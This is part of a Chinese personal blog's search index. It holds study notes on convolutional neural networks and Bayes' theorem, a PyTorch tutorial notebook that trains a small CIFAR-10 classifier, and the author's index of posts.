那么，你也许会好奇卷积层为何能使用互相关运算替代卷积运算。其实，在深度学习中核数组都是学出来的：卷积层无论使用互相关运算或卷积运算都不影响模型预测时的输出。为了解释这一点，假设卷积层使用互相关运算学出图5.1中的核数组。设其他条件不变，使用卷积运算学出的核数组即图5.1中的核数组按上下、左右翻转。也就是说，图5.1中的输入与学出的已翻转的核数组再做卷积运算时，依然得到图5.1中的输出。为了与大多数深度学习文献一致，如无特别说明，本书中提到的卷积运算均指互相关运算。 0x10 解决过拟合1.正则化 dropout 权重衰减（L2 正则化） 2.数据增强 其方法是利用多种能够生成可信图像的随机变换来增加（augment）样本。 其目标是，模型在训练时不会两次查看完全相同的图像。 这让模型能够观察到数据的更多内容，从而具有更好的泛化能力。 在 Keras 中，这可以通过对 ImageDataGenerator 实例读取的图像执行多次随机变换来实现 需要注意的是，不能增强验证数据 3.使用预训练的卷积神经网络 预训练网络（pretrained network）是一个保存好的网络，之前已在大型数据集（通常是大规模图像分类任务）上训练好。如果这个原始数据集足够大且足够通用，那么预训练网络学到的特征的空间层次结构可以有效地作为视觉世界的通用模型，因此这些特征可用于各种不同的计算机视觉问题，即使这些新问题涉及的类别和原始任务完全不同。 使用预训练网络有两种方法：特征提取（feature extraction）和微调模型（fine-tuning）。 3.1 特征提取 对于卷积神经网络而言，特征提取就是取出之前训练好的网络的卷积基，在上面运行新数据，然后在输出上面训练一个新的分类器 卷积基学到的表示可能更加通用，因此更适合重复使用。所以，仅重复使用卷积基，训练密集连接分类器。 特征提取有两种方法 不使用数据增强的快速特征提取 直接调用 conv_base 模型的 predict 方法来从这些图像中提取特征，将输出保存成硬盘中的 Numpy 数组，然后用这个数据作为输入，输入到独立的密集连接分类器中（注意要使用 dropout 正则化），计算量很小，计算代价低。 使用数据增强的特征提取 扩展 conv_base 模型，然后在输入数据上端到端地运行模型。 新定义的模型不只有Dense层，也包括了conv_base模型，但是这个模型卷积基需要冻结（freeze），因为如果不冻结的话，那么卷积基之前学到的表示将会在训练过程中被修改。 3.2 微调模型 对于用于特征提取的冻结的模型基，微调是指将其顶部的几层“解冻”，并将这解冻的几层和新增加的部分（本例中是全连接分类器）联合训练（见图 5-19）。之所以叫作微调，是因为它只是略微调整了所复用模型中更加抽象的表示，以便让这些表示与手头的问题更加相关。 之所以只解冻微调模型底部的一小部分层，是因为： 卷积基中更靠底部的层编码的是更加通用的可复用特征，而更靠顶部的层编码的是更专业化的特征。微调这些更专业化的特征更加有用，因为它们需要在你的新问题上改变用途。微调更靠底部的层，得到的回报会更少。 训练的参数越多，过拟合的风险越大。卷积基有 1500 万个参数，所以在你的小型数据集上训练这么多参数是有风险的。 0x11 卷积神经网络的可视化虽然对于某些类型的深度学习模型来说，深度学习模型是“黑盒”，即模型学到的表示很难用人类可以理解的方式来提取和呈现。但对卷积神经网络来说绝对不是这样。卷积神经网络学到的表示非常适合可视化，很大程度上是因为它们是视觉概念的表示。 可视化卷积神经网络的中间输出（中间激活）：有助于理解卷积神经网络连续的层如何对输入进行变换，也有助于初步了解卷积神经网络每个过滤器的含义。 可视化卷积神经网络的过滤器：有助于精确理解卷积神经网络中每个过滤器容易接受的视觉模式或视觉概念。 可视化图像中类激活的热力图：有助于理解图像的哪个部分被识别为属于某个类别，从而可以定位图像中的物体。 1.0 2.0 随着层数的加深，卷积神经网络中的过滤器变得越来越复杂，越来越精细。 模型第一层（ block1_conv1 ）的过滤器对应简单的方向边缘和颜色（还有一些是彩色边缘）。 block2_conv1 层的过滤器对应边缘和颜色组合而成的简单纹理。 更高层的过滤器类似于自然图像中的纹理：羽毛、眼睛、树叶等。 3.0 参考资料 《python深度学习》(《deep learning with python》(by Francois Chollet)) 秒懂各种深度CNN操作-机器学习算法与Python学习 卷积神经网络（CNN）中卷积的实现 CNN 理解神经网络中卷积(大小，通道数，深度) CNN（卷积神经网络）是什么？有何入门简介或文章吗？ 机器之心 对CNN感受野一些理解]]></content>
      <categories>
        <category>AI</category>
      </categories>
      <tags>
        <tag>AI</tag>
        <tag>CNN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[似然函数和贝叶斯定理]]></title>
    <url>%2F2019%2F07%2F01%2F20190701-%E4%BC%BC%E7%84%B6%E5%87%BD%E6%95%B0%E5%92%8C%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%AE%9A%E7%90%86%2F</url>
    <content type="text"><![CDATA[似然函数和贝叶斯定理 似然函数 已知结果估计概率。 似然函数 极大似然估计 如何理解似然函数，请看这个： 知乎回答：如何理解似然函数 用其中的一句话概括就是： p(x|θ)也是一个有着两个变量的函数。如果，你将θ设为常量，则你会得到一个概率函数（关于x的函数）；如果，你将x设为常量你将得到似然函数（关于θ的函数）。 贝叶斯定理 贝叶斯想解决的问题就是一个逆概率问题，正常情况已知有几个黑球几个红球来计算概率，而贝叶斯与之相反，贝叶斯想要通过往外抽球的结果来判断其中黑色球红色球的比例关系。 用在实际问题上就比较好理解了，比如天气预测，你不知道天上有几个红球和黑球，只知道到目前为止抽过多少球是什么球，所以对于天气的预测其实就可以是一种逆概率问题。 后验概率 = 先验概率 × 可能性函数 可能性函数是指一个可以是先验概率更接近真实概率的一个调整因子 如何理解贝叶斯定理，请看这个 ：知乎文章：如何理解贝叶斯（本文下边很多思想都是来自这篇文章） Part I : 生活中的贝叶斯 贝叶斯的底层思想就是： 如果我能掌握一个事情的全部信息，我当然能计算出一个客观概率（古典概率、正向概率）。 可是生活中绝大多数决策面临的信息都是不全的，我们手中只有有限的信息。既然无法得到全面的信息，我们就在信息有限的情况下，尽可能做出一个好的预测。也就是，在主观判断的基础上，可以先估计一个值（先验概率），然后根据观察的新信息不断修正(可能性函数)。 总结： P（A|B）= P（A）* 调整因子 计算B发生的条件下A发生的概率，它等于先出P（A）先验概率，后边加一个调整因子。 调整因子 = P（B|A） / P（B） P（B） = P（B|A） P（A） + P（B|A’） P（A’） Part II ：贝叶斯与机器学习 贝叶斯定理与人脑的工作机制很像，这也是为什么它能成为机器学习的基础。 如果你仔细观察小孩学习新东西的这个能力，会发现，很多东西根本就是看一遍就会。比如我3岁的外甥，看了我做俯卧撑的动作，也做了一次这个动作，虽然动作不标准，但是也是有模有样。 同样的，我告诉他一个新单词，他一开始并不知道这个词是什么意思，但是他可以根据当时的情景，先来个猜测（先验概率/主观判断）。一有机会，他就会在不同的场合说出这个词，然后观察你的反应。如果我告诉他用对了，他就会进一步记住这个词的意思，如果我告诉他用错了，他就会进行相应调整。（可能性函数/调整因子）。经过这样反复的猜测、试探、调整主观判断，就是贝叶斯定理思维的过程。 同样的，我们成人也在用贝叶斯思维来做出决策。比如，你和女神在聊天的时候，如果对方说出“虽然”两个字，你大概就会猜测，对方后继九成的可能性会说出“但是”。我们的大脑看起来就好像是天生在用贝叶斯定理，即根据生活的经历有了主观判断（先验概率），然后根据搜集新的信息来修正（可能性函数/调整因子），最后做出高概率的预测（后验概率）。 Part III ：贝叶斯是怎么样被训练的（train） 这是在这个暑假中需要学习和解决的问题]]></content>
      <categories>
        <category>AI</category>
      </categories>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker 总结]]></title>
    <url>%2F2019%2F06%2F30%2F20190630-%E5%9F%BA%E4%BA%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%8E%E8%AF%8D%E5%B5%8C%E5%85%A5%E7%9A%84%E6%83%85%E6%84%9F%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[本科毕业设计 论文及部分代码： https://github.com/dyngq/sentiment-analysis-project]]></content>
      <categories>
        <category>Sec</category>
      </categories>
      <tags>
        <tag>Sec</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pytorch 基础]]></title>
    <url>%2F2019%2F06%2F08%2F20190608-pytorch%2F</url>
    <content type="text"><![CDATA[12import torchtorch.__version__ &#39;1.3.1&#39; 0x00 基础tensor基础123456789101112131415x = torch.rand(5, 3)# print(x)x = torch.zeros(5, 3, dtype=torch.long)# print(x)x = torch.tensor([5.5, 3])# print(x)x = torch.ones(5, 3, dtype=torch.double)print(type(x.item))print(x.size())print(x)y = torch.rand(5, 3)print(x + y) &lt;class &#39;builtin_function_or_method&#39;&gt; torch.Size([5, 3]) tensor([[1., 1., 1.], [1., 1., 1.], [1., 1., 1.], [1., 1., 1.], [1., 1., 1.]], dtype=torch.float64) tensor([[1.4885, 1.3968, 1.5492], [1.2027, 1.9136, 1.1277], [1.2467, 1.5696, 1.7672], [1.6679, 1.0424, 1.4230], [1.0175, 1.9733, 1.7792]], dtype=torch.float64) 1234567891011# 方法二# print(torch.add(x, y))# 方法三# result = torch.empty(5, 3)# torch.add(x, y, out=result)# print(result)# 方法四# y.add_(x)# print(y) 1print(y[:,1]) tensor([0.3968, 0.9136, 0.5696, 0.0424, 0.9733]) 123x = torch.randn(4, 4)y = x.view(16)print(x.size(),y.size()) torch.Size([4, 4]) torch.Size([16]) 123x = torch.randn(4, 4)# x = x.reshape(1,-1)x.size() torch.Size([4, 4]) 123456y = x.view(2, 8)y = x.reshape(2, 8)print(x.size(),y.size())x = torch.randn(1)x.item() torch.Size([4, 4]) torch.Size([2, 8]) 0.7401983737945557 Numpy 相关操作tensor2numpy将张量转换成numpy数组 12345a = torch.ones(5)print(a)b = a.numpy()print(b) tensor([1., 1., 1., 1., 1.]) [1. 1. 1. 1. 1.] 将张量+1，并观察上题中numpy数组的变化 123a.add_(1)print(a)print(b) tensor([2., 2., 2., 2., 2.]) [2. 2. 2. 2. 2.] 从numpy数组创建张量 12345import numpy as npa = np.ones(4)b = torch.tensor(a)b = torch.from_numpy(a)b tensor([1., 1., 1., 1.], dtype=torch.float64) 将numpy数组+1并观察上题中张量的变化 123np.add(a, 1, out=a)print(a)print(b) [2. 2. 2. 2.] tensor([2., 2., 2., 2.], dtype=torch.float64) 自动微分张量的自动微分新建一个张量，并设置requires_grad=True 12x = torch.ones(2, 2, requires_grad=True)print(x) tensor([[1., 1.], [1., 1.]], requires_grad=True) 对张量进行任意操作（y = x + 2） 1234y = 2*x**2 + 1print(y)print(y.grad_fn)# out = y.mean() tensor([[3., 3.], [3., 3.]], grad_fn=&lt;AddBackward0&gt;) &lt;AddBackward0 object at 0x000001FE254F3828&gt; 12345z = y ** 2 * 3out = z.mean()print(z) # z多了MulBackwardprint(out) # out多了MeanBackward tensor([[27., 27.], [27., 27.]], grad_fn=&lt;MulBackward0&gt;) tensor(27., grad_fn=&lt;MeanBackward0&gt;) 梯度1out.backward() 1print(x.grad) tensor([[18., 18.], [18., 18.]]) 创建一个结果为矢量的计算过程（y=x*2^n） 1234567x = torch.randn(3, requires_grad=True)y = x * 2while y.data.norm() &lt; 1000: y = y * 2print(y) tensor([-59.5318, 726.0163, 771.8844], grad_fn=&lt;MulBackward0&gt;) 计算v = [0.1, 1.0, 0.0001]处的梯度 1234v = torch.tensor([0.1, 1.0, 0.0001], dtype=torch.float)y.backward(v)print(x.grad) tensor([5.1200e+01, 5.1200e+02, 5.1200e-02]) 关闭梯度的功能 1234567891011print(x.requires_grad)print((x ** 2).requires_grad)with torch.no_grad(): print((x ** 2).requires_grad) # 方法二print(x.requires_grad)y = x.detach()print(y.requires_grad)print(x.eq(y).all()) True True False True False tensor(True) pytorch a.equal(b) 与a.eq(b) a,b是两个列表;a.equal(b)要求整个列表完全相同才是True;a.eq(b) 相同位置值相同则返回对应的True,返回的是一个列表. 神经网络定义网络1234567891011121314151617181920212223242526272829303132333435363738import torchimport torch.nn as nnimport torch.nn.functional as Fclass Net(nn.Module): def __init__(self): super(Net, self).__init__() # 26.定义①的卷积层，输入为32x32的图像，卷积核大小5x5卷积核种类6 self.conv1 = nn.Conv2d(3, 6, 5) # 27.定义③的卷积层，输入为前一层6个特征，卷积核大小5x5，卷积核种类16 self.conv2 = nn.Conv2d(6, 16, 5) # 28.定义⑤的全链接层，输入为16*5*5，输出为120 self.fc1 = nn.Linear(16 * 5 * 5, 120) # 6*6 from image dimension # 29.定义⑥的全连接层，输入为120，输出为84 self.fc2 = nn.Linear(120, 84) # 30.定义⑥的全连接层，输入为84，输出为10 self.fc3 = nn.Linear(84, 10) def forward(self, x): # 31.完成input-S2，先卷积+relu，再2x2下采样 x = F.max_pool2d(F.relu(self.conv1(x)), (2, 2)) # 32.完成S2-S4，先卷积+relu，再2x2下采样 x = F.max_pool2d(F.relu(self.conv2(x)), 2) #卷积核方形时，可以只写一个维度 # 33.将特征向量扁平成行向量 x = x.view(-1, 16 * 5 * 5) # 34.使用fc1+relu x = F.relu(self.fc1(x)) # 35.使用fc2+relu x = F.relu(self.fc2(x)) # 36.使用fc3 x = self.fc3(x) return xnet = Net()print(net) Net( (conv1): Conv2d(3, 6, kernel_size=(5, 5), stride=(1, 1)) (conv2): Conv2d(6, 16, kernel_size=(5, 5), stride=(1, 1)) (fc1): Linear(in_features=400, out_features=120, bias=True) (fc2): Linear(in_features=120, out_features=84, bias=True) (fc3): Linear(in_features=84, out_features=10, bias=True) ) 123456# 打印网络的参数params = list(net.parameters())# print(params)print(len(params))# 打印某一层参数的形状print(params[0].size()) 10 torch.Size([6, 3, 5, 5]) 12345#随机输入一个向量，查看前向传播输出input = torch.randn(1, 3, 32, 32)# print(input)out = net(input)print(out) tensor([[-0.0495, 0.0040, -0.0026, -0.0695, -0.0843, 0.0612, 0.1408, -0.0546, -0.0449, -0.0566]], grad_fn=&lt;AddmmBackward&gt;) 1234#将梯度初始化net.zero_grad()#随机一个梯度进行反向传播out.backward(torch.randn(1, 10)) 1print(net.conv1.bias.grad) tensor([ 0.0215, 0.0639, -0.0101, 0.0102, 0.0425, 0.0004]) 损失函数用自带的MSELoss()定义损失函数 1234567891011criterion = nn.MSELoss()# 随机一个真值，并用随机的输入计算损失target = torch.randn(10) # 随机真值target = target.view(1, -1) # 变成行向量output = net(input) # 用随机输入计算输出loss = criterion(output, target) # 计算损失print(loss) tensor(0.8646, grad_fn=&lt;MseLossBackward&gt;) 123456# 将梯度初始化，计算上一步中loss的反向传播net.zero_grad()print('conv1.bias.grad before backward')print(net.conv1.bias.grad) conv1.bias.grad before backward tensor([0., 0., 0., 0., 0., 0.]) 123456# 计算上上一步中loss的反向传播loss.backward()print('conv1.bias.grad after backward')print(net.conv1.bias.grad) conv1.bias.grad after backward tensor([0.0072, 0.0010, 0.0057, 0.0040, 0.0094, 0.0036]) 更新权重定义SGD优化器算法，学习率设置为0.01 1234567891011import torch.optim as optimoptimizer = optim.SGD(net.parameters(), lr=0.01)# 使用优化器更新权重optimizer.zero_grad()output = net(input)loss = criterion(output, target)loss.backward()# 更新权重optimizer.step() 训练一个分类器读取CIFAR10数据，做标准化构造一个transform，将三通道(0,1)区间的数据转换成(-1,1)的数据 123456import torchvisionimport torchvision.transforms as transforms# transform = transforms.Compose(# [transforms.ToTensor(),# transforms.Normalize((0.5, 0.5, 0.5), (0.5, 0.5, 0.5))]) 12345678910111213141516171819202122232425# 读取数据集transform = transforms.Compose( [ transforms.RandomHorizontalFlip(), transforms.RandomGrayscale(), transforms.ToTensor(), transforms.Normalize((0.5, 0.5, 0.5), (0.5, 0.5, 0.5))])transform1 = transforms.Compose( [ transforms.ToTensor(), transforms.Normalize((0.5, 0.5, 0.5), (0.5, 0.5, 0.5))])trainset = torchvision.datasets.CIFAR10(root='D:/workingspace/Datasets/', train=True, download=False, transform=transform)trainloader = torch.utils.data.DataLoader(trainset, batch_size=100, shuffle=True, num_workers=2)testset = torchvision.datasets.CIFAR10(root='D:/workingspace/Datasets/', train=False, download=False, transform=transform1)testloader = torch.utils.data.DataLoader(testset, batch_size=50, shuffle=False, num_workers=2)classes = ('plane', 'car', 'bird', 'cat', 'deer', 'dog', 'frog', 'horse', 'ship', 'truck') 123net2 = Net()criterion2 = nn.CrossEntropyLoss()optimizer2 = optim.SGD(net2.parameters(), lr=0.001, momentum=0.9) 123456789101112131415161718192021222324252627for epoch in range(2): running_loss = 0.0 for i, data in enumerate(trainloader, 0): # 获取X,y对 inputs, labels = data# print(data) # 51.初始化梯度 optimizer2.zero_grad() # 52.前馈 outputs = net2(inputs) # 53.计算损失 loss = criterion2(outputs, labels) # 54.计算梯度 loss.backward() # 55.更新权值 optimizer2.step() # 每2000个数据打印平均代价函数值 running_loss += loss.item() if i % 2000 == 1999: # print every 2000 mini-batches print('[%d, %5d] loss: %.3f' % (epoch + 1, i + 1, running_loss / 2000)) running_loss = 0.0print('Finished Training') Finished Training 12345678import matplotlib.pyplot as pltdataiter = iter(testloader)images, labels = dataiter.next()# print images# plt.imshow(torchvision.utils.make_grid(images))print('GroundTruth: ', ' '.join('%5s' % classes[labels[j]] for j in range(4)))torchvision.utils.make_grid(images).size() GroundTruth: cat ship ship plane torch.Size([3, 240, 274]) 123456outputs = net2(images)_, predicted = torch.max(outputs, 1)print('Predicted: ', ' '.join('%5s' % classes[predicted[j]] for j in range(4))) Predicted: cat ship ship ship 123456789101112correct = 0total = 0with torch.no_grad(): for data in testloader: images, labels = data outputs = net2(images) _, predicted = torch.max(outputs.data, 1) total += labels.size(0) correct += (predicted == labels).sum().item()print('Accuracy of the network on the 10000 test images: %d %%' % ( 100 * correct / total)) Accuracy of the network on the 10000 test images: 39 % 12345678910111213# 4.6 存取模型# 58.保存训练好的模型# PATH = './cifar_net.pth'# torch.save(net.state_dict(), PATH)# 59.读取保存的模型# pretrained_net = torch.load(PATH)# 60.加载模型# net3 = Net()# net3.load_state_dict(pretrained_net) Tips Parameter类其实是Tensor的子类 PyTorch的 transpose、permute、view、reshape https://www.jianshu.com/p/54f5ccba4057 reshape 封装了 view，view根据规则有时还需要调用contiguous() permute().contiguous().view()相当于reshape permute() 和 tranpose() 比较相似，transpose是交换两个维度，permute()是交换多个维度。 产生分布的函数 函数 功能 tensor.uniform_(-10, 10) 均匀分布 tensor.normal_(mean, std) 标准正态分布 一些基本操作 函数 功能 trace 对角线元素之和(矩阵的迹) diag 对角线元素 triu/tril 矩阵的上三角/下三角，可指定偏移量 mm/bmm 矩阵乘法，batch的矩阵乘法 addmm/addbmm/addmv/addr/baddbmm.. 矩阵运算 t 转置 dot/cross 内积/外积 inverse 求逆矩阵 svd 奇异值分解 PyTorch中的Tensor支持超过一百种操作，包括转置、索引、切片、数学运算、线性代数、随机数等等，可参考官方文档。 Ques log_softmax比softmax多计算一次log，意义在于 加快计算速度，数值上也更稳定。 参考资料：PyTorch学习笔记——softmax和log_softmax的区别、CrossEntropyLoss() 与 NLLLoss() 的区别、log似然代价函数 Pytorch中torch.nn.Softmax的dim参数含义 就是在第几维上 sum=1 tf.nn.softmax中dim默认为-1,即,tf.nn.softmax会以最后一个维度作为一维向量计算softmax 注意：tf.nn.softmax函数默认（dim=-1）是对张量最后一维的shape=(p,)向量进行softmax计算，得到一个概率向量。不同的是,tf.nn.sigmoid函数对一个张量的每一个标量元素求得一个概率。也就是说tf.nn.softmax默认针对1阶张量进行运算,可以通过指定dim来针对1阶以上的张量进行运算,但不能对0阶张量进行运算。而tf.nn.sigmoid是针对0阶张量,。 参考资料：tensorflow中交叉熵系列函数 ？？？？ python 深拷贝、浅拷贝 mean std(标准差) ？？？？ numpy.triu torch.from_numpy ？？？？ 负的维度的使用 ？？？？ torch.view .transpose ？？？？ 标签平滑 KL散度评价]]></content>
      <categories>
        <category>AI</category>
      </categories>
      <tags>
        <tag>pytorch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[写在最前]]></title>
    <url>%2F2019%2F06%2F06%2F19960828-dyngq%2F</url>
    <content type="text"><![CDATA[Keep going … 不管什么时候开始，开始了就不要停止 Notebooks 卷积神经网络总结 stacking总结 统计学习方法笔记 李宏毅机器学习笔记 关于Papers的总结 Papers_NLP方向论文笔记 Papers_CV方向论文笔记 比较完整全面的总结将会放在这一部分，其他的学习思考会放在Daily-log里面 Projects 本科毕业设计：基于深度学习与词嵌入的情感分析系统设计与实现 准考证号“爆破”——解决忘记准考证号无法查询考研初始成绩（校官网） Competitions 201903_研究生入学考试复试PTA机试_刷题 201904_Datacon大数据安全比赛 201907_绿色计算大赛 Daily_logs 2019-06-05_导师让思考的关于模型对于具体问题的选择问题 2019-06-06_一个印地语的情感分析的预选赛 2019-07-21_关于贝叶斯相关概率论知识的学习与简单总结.md 2019-07-22_服务器搭建博客总结 2019-09-16_尝试破解WiFi密码 但行好事，莫问前程 dyngq]]></content>
      <categories>
        <category>dyngq</category>
      </categories>
      <tags>
        <tag>dyngq</tag>
      </tags>
  </entry>
</search>
